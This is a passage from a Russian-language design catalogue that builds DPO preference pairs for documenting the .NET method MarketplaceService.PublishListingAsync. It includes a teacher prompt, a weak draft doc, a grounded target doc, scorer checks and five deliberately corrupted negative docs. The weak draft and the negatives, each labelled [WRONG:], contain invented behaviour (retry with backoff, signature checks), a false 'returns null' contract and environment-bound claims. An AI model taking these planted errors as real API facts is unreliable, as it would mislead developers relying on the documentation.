  held-out (`generic_documentation_qa_accuracy=0.286` при пороге 0.90; `hallucination_rate=0.68` при
  пороге 0.00; `RAG-02` :28–:29, :59–:60), документация СЕЙЧАС галлюцинирует — это НАСТОЯЩИЙ
  измеренный training target, не гипотеза; (б) маршрут `TrainBatchAsync`→узел — **[условно от
  M1/M2]**, runtime сегодня заканчивается детерминированными Bootstrap-юнитами, чекпойнты не грузятся
  (training-vs-runtime wiring gap, `RAG-02` :22); (в) документируемый СУБЪЕКТ — первопартийный
  `.NET`-метод; ось «клиентская документация над Angular» — отдельная задача 6/PE-7 (там субъект =
  Paid-домен, LegScope переобосновывается).

#### PE-6.2 Блок 2 — POSITIVE (chosen) пример промпта

Сценарий (реальный якорь — живой метод `MarketplaceService.PublishListingAsync`, тот же, что PE-4
улучшал кодом — теперь PE-6 его ДОКУМЕНТИРУЕТ; кросс-задачная симметрия «улучшить код ↔
задокументировать код»; контракт метода — из PE-4-якоря `MarketplaceService.cs:27–:81`,
VERIFIED-в-этом-файле PE-4.2/PE-4.6): улучшить документацию серверного метода публикации листинга.
`Y_best` — правдоподобный слабый док (стиль провальной base-модели: расплывчатость + один ложный
контракт + пустой Evidence); `Y_goal` — evidence-grounded wiki-док в живом 8-секционном формате
`DocumentationGeneratorUnit` (:54–:82), где КАЖДОЕ утверждение несёт `file:line`/ev-привязку к
принятой трассе.

**(а) Bounded teacher-call (наш plan-09 §Шаг 3a :492–:502) — заполненный request-JSON (учитель
Qwen3.5-9B, профиль `qwen35-local-v1` plan-08 §3.5.2, видит ТОЛЬКО эти поля, НЕ репозиторий и НЕ
код-базу):**

```json
{
  "task": "Улучшить документацию этого .NET-метода сервиса платформы XIIGen (публикация листинга маркетплейса) в формате wiki-юнита (8 секций живого шаблона DocumentationGeneratorUnit). КАЖДОЕ утверждение обязано опираться на код-факт (file:line ЛИБО evidence-id) из input_context; поведение, которого НЕТ в трассе, документировать ЗАПРЕЩЕНО. Объясни WHY (зачем метод существует), HOW (шаги алгоритма), WHAT (точный контракт: параметры/возврат/коды ошибок). Не выходи за пределы одного метода.",
  "target_unit": "server-docs/xiigen-platform/marketplace-publish-listing",
  "input_context": "documentation_unit (проекция 15-полевого ProjectDocumentationUnit, модели :1561–:1576): symbol=MarketplaceService.PublishListingAsync; source=src/Xiigen.Platform.Marketplace/MarketplaceService.cs:27; target_framework=net10.0; lang_version=SDK-default; signature: Task<DataProcessResult<IReadOnlyDictionary<string, object?>>> PublishListingAsync(PublishMarketplaceListingRequest request, CancellationToken cancellationToken = default); код-факты трассы (evidence, PE-4-контракт): [ev-01] guard-цепочка Failure-кодов FLOW_ID_REQUIRED / FLOW_SLUG_REQUIRED / MODULE_NAME_REQUIRED / PACKAGE_REQUIRED; [ev-02] version = Packages[0].Version, детерминированный id = ListingId(flowSlug, version); [ev-03] тело документа: publisherTenantId = CurrentTenant.TenantId, status=\"listed\", createdAt/updatedAt, correlationId = CurrentCorrelationId; [ev-04] IDocumentStore.UpsertAsync(ListingsCollection=\"marketplace-listings\", id, body, cancellationToken); [ev-05] error-mapping: Success(stored.Data.Body) ЛИБО Failure(код фабрики ?? LISTING_STORE_FAILED) — null НЕ возвращается ни на одном пути; [ev-06] caller call-edge: Xiigen.Platform.Api marketplace publish endpoint; callees: ListingId, IDocumentStore.UpsertAsync",
  "current_best_output": "<Y_best-док — слабый черновик, развёрнут в блоке ниже; в транспорте — JSON-escaped строка>",
  "requirements": [
    "evidence-grounding (ПЕРВИЧНАЯ ось): каждое claim-предложение дока несёт привязку (file:line ЛИБО evidence-id) к код-факту из input_context; grounding rate = 1.0",
    "hallucination = 0 (ось RAG-02, порог 0.00 при измеренном провале 0.68): ни одного утверждения о поведении, которого нет в трассе (retry, валидация подписи, e-mail, кэширование и т.п. запрещены, если их нет в evidence) — ось скорера doc_hallucinated_claim",
    "contract-accuracy: параметры/возврат/КАЖДЫЙ Failure-код byte-exact к трассе (FLOW_ID_REQUIRED, FLOW_SLUG_REQUIRED, MODULE_NAME_REQUIRED, PACKAGE_REQUIRED, LISTING_STORE_FAILED); явно сказать, что null НЕ возвращается",
    "section-completeness: все 8 обязательных секций живого шаблона DocumentationGeneratorUnit (Meaning/Location/Parameters/Return/Called By/Calls/Stack And Version/Evidence, :19–:29) — ось скорера documentation_required_field_missing",
    "WHY/HOW/WHAT-читаемость: Meaning объясняет назначение и идемпотентную семантику (детерминированный id + upsert), а не пересказывает имя метода — ось скорера PromptError-11 Vague",
    "никаких environment-зависимых утверждений: документируется контракт интерфейса (IDocumentStore fabric-first), НЕ конкретный провайдер/машина/путь развёртывания — ось скорера PromptError-12 Context Dependency"
  ],
  "wrong_markers": [
    "doc_hallucinated_claim", "ORCH-02", "PromptError-11", "PromptError-09", "PromptError-12"
  ],
  "output_schema": {
    "goal_text": "string — улучшенный wiki-док метода (markdown, 8 секций живого шаблона); один метод, не файл и не проект",
    "improvements": "string[] — существенные улучшения относительно current_best_output",
    "current_output_is_already_optimal": "bool — self-report учителя (диагностика, НЕ приёмка)"
  }
}
```

**`Y_best` (current_best_output, развёрнуто; правдоподобный слабый док в стиле провальной
base-модели — расплывчатость + один ложный контракт + пустой Evidence; это НЕ инъекции негативов,
а слабый черновик с несколькими слабостями, как `Y_best` PE-4/PE-5):**

```markdown
# PublishListingAsync

## Meaning
Публикует листинг маркетплейса. Валидирует запрос и сохраняет листинг в хранилище.

## Location
MarketplaceService.cs

## Parameters
- request

## Return
Возвращает сохранённый листинг, либо null, если сохранение не удалось.

## Called By
- none recorded

## Calls
- none recorded

## Stack And Version
- unknown

## Evidence
- none recorded
```

Слабости `Y_best` (то, что учитель должен улучшить): Meaning пересказывает имя метода (нет
идемпотентной семантики, tenant-владельца, аудита); Location без строки; Parameters без контракта
полей и без `cancellationToken`; Return несёт ЛОЖНЫЙ контракт «либо null» (живой код null НЕ
возвращает ни на одном пути — [ev-05]) и ни одного Failure-кода; Called By/Calls/Stack/Evidence
пусты (5 из 8 живых флагов :19–:29 провалены). Это ровно профиль измеренного провала: пересказ без
grounding (`0.286`) + ложное утверждение (`0.68`).

Бюджет (plan-09 :499; plan-08 §3.5.2 :814, `num_ctx≈8192`): `max_input_tokens = num_ctx −
reserved_output_tokens`. Аппроксимация автора: task+criteria ≈ 800 ток.; input_context ≈ 900;
current_best_output ≈ 250; format ≈ 350; резерв ответа 1024 — итого ≈ 3300 ≪ 8192: unit-level (док
ОДНОГО метода, не «весь проект»), влезает без порезки (`trimmed=false`; фактический токен-счёт
меряет токенайзер при build, каталог его НЕ заявляет).

**(б) Ожидаемая форма ХОРОШЕГО выхода (`goal_text` = `Y_goal`; wiki-док в живом 8-секционном
формате :54–:82, каждое утверждение трассируемо):**

```markdown
# MarketplaceService.PublishListingAsync

## Meaning
Публикует (или идемпотентно перепубликует) листинг flow-модуля в маркетплейсе платформы: валидирует
запрос guard-цепочкой, собирает документ листинга с tenant-владельцем и аудит-полями и выполняет
upsert по детерминированному id = ListingId(flowSlug, version) — повтор той же публикации обновляет
ту же запись, не создаёт дубликат [ev-01, ev-02, ev-03, ev-04].

## Location
src/Xiigen.Platform.Marketplace/MarketplaceService.cs:27

## Parameters
- request: PublishMarketplaceListingRequest — FlowId, FlowSlug, ModuleName, SourceRepo, SourcePath,
  CommitHash, Packages[{Version,…}], Metadata; версия листинга берётся из Packages[0].Version [ev-02]
- cancellationToken: CancellationToken = default — форвардится в IDocumentStore.UpsertAsync [ev-04]

## Return
Task<DataProcessResult<IReadOnlyDictionary<string, object?>>>. Success = тело сохранённого листинга.
Failure-коды: FLOW_ID_REQUIRED, FLOW_SLUG_REQUIRED, MODULE_NAME_REQUIRED, PACKAGE_REQUIRED [ev-01];
при ошибке хранения — код/сообщение фабрики, иначе LISTING_STORE_FAILED [ev-05]. null НЕ
возвращается ни на одном пути [ev-05].

## Called By
- Xiigen.Platform.Api marketplace publish endpoint (call-edge из принятой трассы) [ev-06]

## Calls
- ListingId(flowSlug, version) — детерминированный id листинга [ev-02]
- IDocumentStore.UpsertAsync("marketplace-listings", id, body, cancellationToken) [ev-04]

## Stack And Version
Target framework: net10.0; C# language version: SDK-default.

## Evidence
- ev-01 (guard-цепочка Failure-кодов); ev-02 (id/version); ev-03 (тело документа: tenant/аудит);
- ev-04 (upsert в marketplace-listings); ev-05 (error-mapping, null-never); ev-06 (caller call-edge)
```

```json
{
  "improvements": [
    "evidence-grounding: каждое claim-предложение получило file:line/evidence-id привязку (grounding rate 1.0; в черновике Evidence был пуст)",
    "устранён ложный контракт «либо null»: живой код возвращает Failure с кодом фабрики либо LISTING_STORE_FAILED, null не возвращается ни на одном пути [ev-05]",
    "contract-accuracy: перечислены все 4 guard-кода валидации + LISTING_STORE_FAILED byte-exact к трассе",
    "Meaning стал WHY/HOW/WHAT: идемпотентная семантика (детерминированный id + upsert), tenant-владелец, аудит-поля — вместо пересказа имени метода",
    "заполнены все 8 обязательных секций живого шаблона (в черновике 5 из 8 флагов провалены): Called By/Calls/Stack And Version/Evidence",
    "environment-зависимых утверждений нет: документирован контракт IDocumentStore (fabric-first), не конкретный провайдер"
  ],
  "current_output_is_already_optimal": false
}
```

**(в) Пер-доменные проверки `IndependentDomainScorer` (doc-ось — карта §3 строка 5:
«grounding-проверка: каждое утверждение ссылается на реальный код-факт (anti-hallucination; порог
из `RAG-02`)»; детерминированный eval-only судья; пороги/веса — per-WO деталь, WO может только
УЖЕСТОЧИТЬ):**
1. **structured-JSON валидность** ответа учителя (невалидный кандидат — вне argmax);
2. **grounding-rate (ПЕРВИЧНАЯ ось):** детерминированный сплит `goal_text` на claim-предложения →
   каждое обязано нести распознаваемую привязку (`:NN`/`file:line`/`ev-NN`) к факту из
   `input_context`; предложение без привязки = ungrounded; rate < 1.0 — провал (живой числовой
   носитель той же оси: `exact_evidence_accuracy` оркестратора :129 + `ProjectWikiCoverageVerifier`);
3. **anti-hallucination чек (`doc_hallucinated_claim`):** каждое привязанное утверждение сверяется
   с ТЕКСТОМ факта; привязка к `ev-NN`, чьё содержание НЕ поддерживает утверждение
   (retry/подпись/e-mail/кэш, которых нет в трассе) = класс `doc_hallucinated_claim`; полный
   семантический чекер — **[условно от M1]**, детерминированный прокси = точное совпадение
   кодов/сигнатур/имён из трассы;
4. **contract-accuracy:** counted-сверка контрактных литералов — 4 guard-кода + `LISTING_STORE_FAILED`
   + сигнатура + имя коллекции byte-exact к `input_context`; ложный контракт (например «возвращает
   null») — провал (класс `PromptError-09`, если это рассинхрон с кодом);
5. **section-completeness:** живые 8 флагов `DocumentationGeneratorUnit` (:19–:29) — все true; провал
   любого = живой warning `documentation_required_field_missing` (:30);
6. **vague-чек (`PromptError-11`):** Meaning не совпадает с пересказом имени символа и несёт ≥2
   контрактных факта (идемпотентность/tenant/аудит) — иначе класс `PromptError-11 Vague`;
7. **environment-чек (`PromptError-12`):** запрещённые environment-литералы (абсолютные пути, имена
   машин, конкретный провайдер как контракт) — класс `PromptError-12 Context Dependency`.

Решение гейта (наш `ChosenSelectionRule`, plan-09 :497–:498): `Y_goal := argmax_k Score(g_k)`
(best-of-K ЦЕЛИ учителя, `k_generations=4` PROPOSED_DEFAULT); `chosen = Y_goal ⇔ Score(Y_goal) >
Score(Y_best)`, ничья/НЕТ → `chosen = Y_best` (лучший кандидат УЧЕНИКА). Судейские скоры
(grounding/contract/sections) — `preference_score`/`Y_best`-аудит, они НЕ авторствуют
`chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Живое поле `Confidence` юнита
(:43) в приёмке НЕ участвует (PE-6.5 п.2). Непобедившие генерации учителя `g_k` (k≠argmax) —
eval-only.

**(г) STUDENT-проекция (типизированный unit-I/O обучаемой стороны):** doc-юнит:
`InputContext{documentation_unit (15-полевая проекция `ProjectDocumentationUnit`), y_best_doc}` →
улучшенный wiki-док (текст). В паре: `InputContext` = типизированный юнит + черновик (БЕЗ сырого
промпта пользователя — анти-replay), `Chosen` = принятый док, `Rejected` = дефектный вариант.
Достижимость студентом (≤3–4B / узкая специализация): единица — ОДИН короткий док в ЖЁСТКОМ
8-секционном шаблоне с конечным словарём паттернов (секции фиксированы, факты подставляются из
типизированного входа, привязки — из evidence-ids) — структурный выход, не свободное эссе; сегодня
живой генератор — детерминированный шаблонизатор (честный scaffold), обученный юнит должен ЗАМЕНИТЬ
шаблонную подстановку выученной генерацией с сохранением grounding-инварианта; до обучения студент
честно отдаёт not_ready — путь `PASS_AS_HONEST_UNTRAINED_SCAFFOLD` (runtime уже говорит это сам:
`runner_missing` :68, «no trained-weight claim was made» :153). Всё **[условно от M1/M2]**.

#### PE-6.3 Блок 3 — NEGATIVE (rejected) примеры: ТА ЖЕ задача, РОВНО ОДНА внедрённая ошибка

Каждый негатив — Error-Injection над хорошим доком (б): полный правдоподобный wiki-док (НЕ отказ,
НЕ мусор — G1) с ОДНОЙ главной ошибкой; всё остальное без изменений. Коды: **1 критический
доменно-локальный `doc_hallucinated_claim`** (право §2.3; класс false-presence, ОТСУТСТВУЮЩИЙ в
живой таксономии генератора) + **4 канонических** кода строки 5 карты §3. Живой доменный стиль
подтверждён кодом: генератор уже кладёт `[WRONG:]` в rejected-текст (:74–:97) и гейтит
`wrong_annotation_rate` (:39–:44). Аннотация строго `[WRONG: код — описание — последствие]`, ровно
одна главная ошибка.

**N1 — критический (THE-дефект домена: `doc_hallucinated_claim`, false-presence; главная ось
скорера).** В секцию Meaning добавлено утверждение с фиктивной привязкой:
`«Перед записью метод проверяет подпись CommitHash и повторяет upsert до трёх раз с экспоненциальной задержкой [ev-04].»` (всё остальное без изменений)
`[WRONG: doc_hallucinated_claim (доменно-локальный, КРИТИЧЕСКИЙ; родитель канонически ОТСУТСТВУЕТ — измеренный главный дефект RAG-02 hallucination_rate=0.68 при пороге 0.00; в живой таксономии генератора класса НЕТ — все 10 counted rejected-веток = omission/false-absence; ось скорера doc_hallucinated_claim) — док утверждает поведение (валидация подписи, retry с backoff), которого НЕТ в код-трассе, и маскирует его правдоподобной привязкой к ev-04: разработчик планирует изменение в расчёте на несуществующий retry — импакт-анализ и legacy-правки строятся на выдумке; ровно тот класс false-presence, что завалил held-out base-модели (0.68), и которого нет ни в doc-генераторе, ни в PromptError/ORCH-каноне]`

**N2 — канонический (`ORCH-02 Missing Evidence`; grounding снят).** Все `file:line`/ev-привязки
удалены из всех секций, секция Evidence заменена на `- none recorded`; текст утверждений сохранён:
`[WRONG: ORCH-02 Missing Evidence (канонический; живой доменный сиблинг missing_evidence — DocumentationGeneratorDpoGenerator.cs:83–:84 «produces text that cannot be cited or verified by the project-local wiki») — утверждения дока верны, но непроверяемы: wiki не может ни процитировать, ни валидировать их против трассы; ломается сам продукт-инвариант project-local wiki (ответ с точными code-evidence), grounding rate падает с 1.0 до 0]`

**N3 — канонический (`PromptError-11 Vague Deliverables`; расплывчатость).** Meaning и Return
заменены пересказом без контракта:
`«## Meaning\nМетод публикует листинг и обрабатывает возможные ошибки.\n…\n## Return\nВозвращает результат операции публикации.»` (привязки и остальные секции без изменений)
`[WRONG: PromptError-11 Vague Deliverables (канонический) — контракт растворён в общих словах: ни одного Failure-кода, ни идемпотентной семантики, ни tenant-владельца; по такому доку нельзя ни вызвать метод правильно, ни сделать импакт-анализ — деливерабл документации не поставлен, хотя текст выглядит «нормальным»]`

**N4 — канонический (`PromptError-09 Missing Documentation Sync`; док отстал от кода).** Секция
Return описывает СТАРЫЙ контракт:
`«Возвращает null при ошибке хранения; запись выполняется в коллекцию "listings".»` (всё остальное без изменений)
`[WRONG: PromptError-09 Missing Documentation Sync (канонический) — док не синхронизирован с живым кодом: живой хвост возвращает Failure(код фабрики ?? LISTING_STORE_FAILED), null НЕ возвращается ни на одном пути [ev-05], а коллекция = "marketplace-listings" [ev-04]; caller, написанный по этому доку, проверяет null вместо IsFailure и молча глотает код ошибки фабрики — класс дефекта, ради которого доки обязаны следовать за кодом (CLAUDE.md «Documentation follows code»)]`

**N5 — канонический (`PromptError-12 Context Dependency`; контекстная зависимость).** В
Meaning/Calls добавлено environment-утверждение как контракт:
`«Хранилище — SQLite-файл xiigen-platform.db в корне репозитория; метод корректно работает при запуске из Visual Studio на dev-машине.»` (всё остальное без изменений)
`[WRONG: PromptError-12 Context Dependency (канонический) — контракт метода привязан к одному окружению/провайдеру: живой контракт = интерфейс IDocumentStore (fabric-first, провайдер резолвится снаружи — Rule 2 DNA), SQLite — лишь один из провайдеров; док становится ложным при любом другом развёртывании (InMemory/иная фабрика), переносимость документации (цель generic-обучения base-wiki «без фактов проектов») разрушена]`

**Маппинг на канон (честная нота именования, single-owner FC-44):** N1 несёт ЯВНЫЙ
доменно-локальный код `doc_hallucinated_claim`, потому что среди канонических
`PromptError-01..12`/`ORCH-01..10` НЕТ кода для false-presence/hallucination И его нет в живой
таксономии doc-генератора (counted: 10 rejected-веток, все omission) — это ТОЧЕЧНО тот пробел,
который дал `hallucination_rate=0.68`. N2–N5 несут КАНОНИЧЕСКИЕ имена (`ORCH-02`, `PromptError-11`,
`PromptError-09`, `PromptError-12`) — переименовывать канонические имена ЗАПРЕЩЕНО (no dual-canon).
Гейты пары: G1 (каждый N — полный правдоподобный док: выдумка/без-цитат/вода/устарело/среда —
профиль измеренного провала `0.286`/`0.68`, не отказ и не мусор); G2/G3 (код + `[WRONG:]`
присутствуют, живой доменный стиль :74–:97); G5 (не почти-копия по дифф-региону — доковый гейт
PE-6.4); G6 (классы типичны: hallucination/без-evidence — измеренные оси held-out гейта; vague/
stale/context — канонические `PromptError`-классы строки 5). Каждый N — ровно одна главная ошибка;
слабый негатив (например, отличие только в имени переменной) → отбраковка предохранителем
(`PromptError-08 Poor Negative Examples` / `ORCH-10 Low Signal Negative`, §1.3 п.6), НЕ обучение.
Живые omission-классы генератора (`missing_callers`/`missing_callees`/`missing_stack_version`/
`missing_evidence` + 5 SQL-классов + `partial_documentation` — counted 10) в этом проходе НЕ
дублируются отдельными N: `missing_evidence` покрыт N2 (канон `ORCH-02`), SQL-семья — зона PE-8;
остальные omission-классы = живой уже существующий seed-корпус (честная нота PE-6.4).

#### PE-6.4 Блок 4 — DPO-PAIR-READINESS (эскиз 14-полевой проекции `GraphDpoPair`, §1.4)

```json
{ "PairId": "server-docs-pair-0001",
  "Level": "unit",
  "NodeOrEdgeId": "server-docs/xiigen-platform/marketplace-publish-listing",
  "InputContext": { "documentation_unit": "15-полевая проекция ProjectDocumentationUnit (модели :1561–:1576): symbol=MarketplaceService.PublishListingAsync; source/line; target_framework=net10.0; meaning; parameters; return; callees; callers; evidence-ids ev-01..ev-06 (код-факты трассы, PE-4-контракт)",
                    "y_best_doc": "<слабый черновик Y_best из PE-6.2>" },
  "Chosen":   { "doc_text": "<док (б): 8 секций живого шаблона, каждое утверждение с file:line/ev-привязкой, grounding rate 1.0>" },
  "Rejected": { "doc_text": "<N1: hallucinated-claim (retry/подпись) с фиктивной привязкой к ev-04>" },
  "WrongMarkers": ["[WRONG: doc_hallucinated_claim — док утверждает retry/валидацию подписи, которых нет в трассе — импакт-анализ строится на выдумке]"],
  "Reason": "Документация project-local wiki обязана быть evidence-grounded: каждое утверждение трассируется к код-факту; галлюцинированное поведение — главный измеренный дефект домена (hallucination_rate=0.68 при пороге 0.00) и прямой провал продукт-инварианта «ответ с точными code-evidence»",
  "TeacherProvenance": { "указатель": "nested 20-полевой канон plan-08 §3.1 (:389-409); заполняет детерминированный TeacherProvenanceAdapter (plan-09 :501), НЕ LLM; teacher_output_used_for_training — по исходу гейта ChosenSelectionRule; closed_proprietary_model=false (local_self_hosted_open_weight qwen35-local-v1)" },
  "SourceIds": ["llm-mvp-core-42-docpipeline-spotread", "xiigen-platform-marketplace-pe4-anchor", "catalog-pe6-server-docs-seed-0001"],
  "HeldOut": false,
  "CandidateOrderInvariant": true,
  "ExcludedLeakageSignals": ["candidate_index", "source_path", "source_id", "file_order", "correlation_id", "exact_prompt"],
  "DpoTrainReady": false }
```

- **Поле 14 `DpoTrainReady` = `false` [условно от M1 + G-DPO-FINAL] (согласовано с PE-2..PE-5,
  §1.1, §4 п.6) — ФЛИП против образца-Fable (тот ставил `true`), с УНИКАЛЬНОЙ доменной нотой.**
  Доменного Phase-0-блока (как `TOKENIZER_BLOCKED` у HE_EN) НЕТ: латиница/русский токенайзер не
  блокируют; первопартийный корпус существует. Домен УНИКАЛЕН среди PE-2..PE-6 по ДВУМ живым
  фактам: (1) доменный DPO-генератор УЖЕ существует в коде (`DocumentationGeneratorDpoGenerator` с
  батч-гейтами :39–:44) — единственный из 6 Bootstrap-контуров с живым wiki-content DPO-seed
  (`RAG-01` :253); (2) реальный траин/приёмка УЖЕ выполнялись и ПРОВАЛИЛИ held-out (`0.286`/`0.68`,
  `RAG-02` :28–:29,:59–:60) — training target ИЗМЕРЕН, а не предположен. НО `false` держат
  ГЛОБАЛЬНЫЕ предусловия (как у PE-4/PE-5), а не «домен не готов»: (а) до `G-DPO-FINAL` (overlay
  :48–:53) любой teacher-выход этапа `TP1_LOCAL` — eval/quarantine, никакого `TrainBatchAsync`,
  никакого промоушена checkpoint; (б) builder/скорер/grounding-клаузный чекер канона в коде НЕ
  существуют — **[условно от M1]**; (в) training-vs-runtime wiring gap: чекпойнты не грузятся на
  runtime-путях, диагноз провала = hash-token DPO-раннер + отсутствует обученный
  `ProjectWikiQueryPlanningFlow` (`RAG-02` :22); (г) живая негативная таксономия — 10 counted
  omission-веток, 0 hallucination-классов, при том что hallucination = главная провальная метрика:
  `N1` этого каталога = seed ровно недостающего класса, но seed ≠ обученная способность. Отличие от
  образца-Fable (`true`): наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ задач — иначе
  `dual-live-canon` статуса готовности (FC-44). Всё **[условно от M1 + G-DPO-FINAL]**.
- **Reward-scalarization (ОБЯЗАТЕЛЬНА по trainable-architecture-decision SI_GATE_3 — сторона
  дока НЕ атомарный ответ, а строка-СТРУКТУРА → нужен именованный `reward(side)`-экстрактор; наш
  plan-07 :341–:360, VERIFIED живым чтением этим пассом).** `SerializeCandidate(side)=doc_text`;
  далее каноном блока 07: `reward(side)=Beta·(policyLogP(doc_text | input_context) −
  referenceLogP(doc_text | input_context))`; `margin = chosenReward − rejectedReward`. Судейские
  скоры (grounding/contract/sections) → `preference_score`/`Y_best`-аудит, они НЕ авторствуют
  `chosen`/`rejected` и НЕ заменяют `reward(side)` (plan-07 :355–:357). Сторону без
  сериализации/скаляризации → `REWARD_EXTRACTOR_MISSING` (plan-07 :359–:360). `margin ≤ 0.05` или
  `overlap ≥` доменный порог → `LOW_CONTRAST`, не учим (plan-07 :520).
- **EVIDENCE-GROUNDING гейт (ПЕРВИЧНЫЙ доменный гейт этого прохода — сильнее overlap):** пара
  валидна ТОЛЬКО при grounding-дифференциале сторон: `chosen` — каждое claim-предложение несёт
  привязку к трассе, grounding rate = 1.0 И ни одна привязка не противоречит тексту факта;
  `rejected` — ≥1 ungrounded-предложение ЛИБО ≥1 привязка, чей факт не поддерживает утверждение
  (`N1` — фиктивная привязка к ev-04; `N2` — привязки сняты). Разделяющий сигнал доменной пары —
  ИМЕННО этот дифференциал, а не текстовая близость: доковая пара с идеальным overlap-окном, но без
  grounding-дифференциала = не doc-пара, а стилистическая. Живой числовой носитель оси —
  `exact_evidence_accuracy` (оркестратор :129) + `ProjectWikiCoverageVerifier`; клаузный чекер
  канона — **[условно от M1]**.
- **DOC-OVERLAP гейт (ВТОРИЧНЫЙ; доменное окно этого прохода — рестейт PE-4.4/PE-5.4 для доков):**
  одно-дефектная инъекция в ~35-строчный док даёт raw overlap ≫ 0.75 by construction — правило
  вычитания рамки переносится с доковой рамкой: `frame` = section-headers шаблона (8 counted
  заголовков :54–:82) + verbatim контрактные строки из `input_context` (сигнатура/коды/имена полей —
  легальная общая основа обеих сторон); `shared=(chosen∩rejected)−frame; total=(chosen∪rejected)−
  frame; overlap_ratio=shared/total`. Гейт ОДНОСТОРОННИЙ: `overlap_ratio > 0.75 → discard`; нижней
  границы НЕТ; порог материальности: дифф-регион ≥ 1 claim-предложение ЛИБО ≥ 1 секция
  (omission-класс); rename/whitespace/пунктуация-only дифф → discard (класс G5). **Обязательная
  кавета (concept vs runtime):** `0.75` — КОНЦЕПТУАЛЬНЫЙ порог (перенос PE-4.4); runtime-мерителя
  НЕ существует **[условно от M1]**; калибровка = обязанность DPO-build. `N1`–`N5` сконструированы с
  непересекающимися дифф-регионами (добавленное hallucination-предложение / снятые привязки / замена
  Meaning+Return / ложный Return-контракт / environment-вставка) — попарный overlap дифф-регионов ≈ 0
  by construction; фактический `overlap_ratio` меряет builder, НЕ каталог.
- **Fan-out (winner-vs-each-loser, SI_GATE_4):** 5 негативов на один `chosen` → 5 ОТДЕЛЬНЫХ пар
  `server-docs-pair-0001..0005` (по одной на `N1`..`N5`); поле `Rejected` НИКОГДА не несёт список
  (§1.3 п.10; владелец проекции `producer-output → SourceRow[]` — builder WO-M1.1). Живая проекция:
  доменный record `DocumentationGeneratorDpoPair` уже 1-к-1 (одна `Rejected`-строка на пару) —
  live→канон маппинг прямой.
- **LegScope: `common`-кандидат (Free=.NET tier) — ОБРАТНО к серверу PE-4, ПРОТИВОПОЛОЖНО
  Paid=Angular PE-5:** `RAG-02` :18 называет Free-tier ПО ИМЕНИ этого домена; источник =
  первопартийный код/трассы Luba (`source_authority=first_party_internal`). ЖЁСТКАЯ privacy-граница
  R-07/R-13: пары из доков/трасс ЧУЖОГО пользовательского проекта — `PersonalAdaptive`/`.xiigen` до
  redaction+approval (`BLOCK_FOR_COMMON`; индекс и адаптивное состояние на стороне пользователя);
  generic-обучение base-wiki по канону «без фактов проектов» (approved source families) — внешние
  doc-корпуса при подтяжке проходят лицензионный гейт (MIT/Apache preferred), в ЭТОМ проходе внешние
  корпуса НЕ подтягивались.
- **Source-disjoint нота (HeldOut):** train = первопартийные доки-якоря РАЗНЫХ репо (xiigen-platform
  Marketplace + xiigen-flows `Xiigen.Flow.*.Application` сервисы — PE-4-якоря тех же семей); held-out =
  ДРУГАЯ source-семья (кандидаты: доки методов доменов `llm_mvp_core` вне 42 — например
  25.ModelServer/44-домен; НЕ те же методы, что в train); `HeldOut` — поле пары; лексический
  Jaccard-guard train↔eval обязателен (§1.3 п.9) — урок измеренного провала: held-out Q/A и был
  гейтом, который вскрыл `0.286`.
- **Leakage-нота (доковая специфика — ВСЕ 6 сигналов канона §1.4, образец-Fable нёс 5, терял
  `source_id`):** `ExcludedLeakageSignals` = полный канон `candidate_index`/`source_path`/`source_id`/
  `file_order`/`correlation_id`/`exact_prompt`. Доковое противоречие `source_path`: канон запрещает
  его как input-фичу СЕЛЕКЦИИ кандидата, но в доковом домене путь+строка — ЛЕГАЛЬНОЕ СОДЕРЖИМОЕ
  выхода (секция Location — обязательный флаг :22 живого юнита). Разрешение: запрет действует на
  builder-селекцию (путь не смеет быть признаком выбора chosen/rejected), содержимое секций дока под
  запрет НЕ подпадает — иначе доменная задача неисполнима by construction.
- **Композиция батча (ориентир будущего DPO-build, НЕ capability-заявка):** канонического
  распределения doc-классов нет ни в `RAG-02`, ни в `RAG-10` — честная нота; ориентир-аналогия
  `RAG-10` §6.7: критический класс (`doc_hallucinated_claim`) ≈ 25% батча, негативов 60–70% от
  positive; ОБЯЗАТЕЛЬНОЕ доменное правило баланса длины (см. PE-6.5 п.3(б)): omission-классы (короче
  chosen) и addition/hallucination-классы (длиннее chosen) смешиваются так, чтобы длина не
  коррелировала с меткой; живой генератор даёт готовый omission-seed (10 веток), hallucination-семья
  строится от `N1`; точный баланс = обязанность DPO-build, НЕ каталога.

#### PE-6.5 Блок 5 — ГЕЙТЫ ЧЕСТНОСТИ ПРИМЕРА

1. **Маркер срезается ДО обучения (§1.3 п.4):** `[WRONG:]` живёт в поле `WrongMarkers` и в
   `rejected`-ИСТОЧНИКЕ, но из ТРЕНИРУЕМОГО `rejected`-представления срезается до токенизации.
   Доменная ОСТРОТА гейта: живой генератор кладёт `[WRONG:]` ПРЯМО В ТЕКСТ rejected (:74–:97) и
   гейтит их наличие (`wrong_annotation_rate` :39–:44) — при переиспользовании живых доменных пар
   builder ОБЯЗАН выполнить strip, иначе тренер выучит детекцию тега на первом же батче; это не
   гипотетический риск, а свойство существующего кода.
2. **Acceptance-signal independence (plan-09 :504–:544; SI_GATE_6/SI_GATE_7):** `chosen` решает
   ТОЛЬКО детерминированный doc-`IndependentDomainScorer` (grounding/contract/sections);
   `current_output_is_already_optimal` учителя — диагностика, скоринг исполняется ВСЕГДА;
   `acceptance_signal_source != teacher_self_report` И `!= trained_unit_self_confidence`. КОНКРЕТНАЯ
   живая ловушка домена: `DocumentationGeneratorOutput.Confidence` (`ProjectWikiDomainModels.cs:1137`;
   вычисляется как `flags.Count/flags.Length` — `DocumentationGeneratorUnit.cs:43`) — self-report
   САМОГО юнита (доля заполненных секций) — НЕ смеет быть сигналом приёмки (тот же класс, что
   fixed-confidence ~0.35 `ProjectLocalWikiModelUnit`, `RAG-01` :252, R4-флаг). `Y_best`-selection
   классифицирован как детерминированный eval-only baseline (SI_GATE_6), не скрытая trainable-власть.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + доковая специфика):** (а) НЕ константный промпт — пары
   батча от ≥2 разных методов/репо (platform Marketplace + flows `Application`-сервисы);
   **(б) доковый length-hack — ОСТРЕЙШАЯ ось домена:** omission-негативы (живая 10-веточная семья)
   систематически КОРОЧЕ chosen (секция удалена), hallucination-негативы (`N1`-семья) — ДЛИННЕЕ
   chosen (предложение добавлено); батч только из omission научит «длиннее = лучше», только из
   addition — «короче = лучше»; ОБЯЗАТЕЛЬНОЕ правило: смешивать обе семьи так, чтобы длина не
   коррелировала с меткой; (в) НЕ confidence-leakage — числовое поле `Confidence` юнита в тексты
